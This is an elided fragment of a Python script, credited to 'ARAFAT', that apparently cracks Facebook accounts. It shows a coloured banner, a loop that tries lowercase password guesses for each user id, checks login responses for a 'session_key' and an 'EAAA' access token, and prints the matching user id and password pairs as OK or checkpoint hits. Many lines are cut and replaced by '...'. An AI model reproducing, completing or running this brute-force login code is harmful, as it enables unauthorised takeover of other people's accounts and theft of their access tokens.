# THE CREATOR OF THIS TOOL ARE ARAFAT
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
\033[1;32m╚══════════════════════════════════════════════════════════╝   
\033[1;32mAfter Log-in CP id clear FB data.
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[ARAFAT] : %s/%s -> \033[0;97m [OK:%s ] \033[0;97m[CP:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [ARAFAT-CP] %s | %s\033[0;97m         "%(uid, pw))
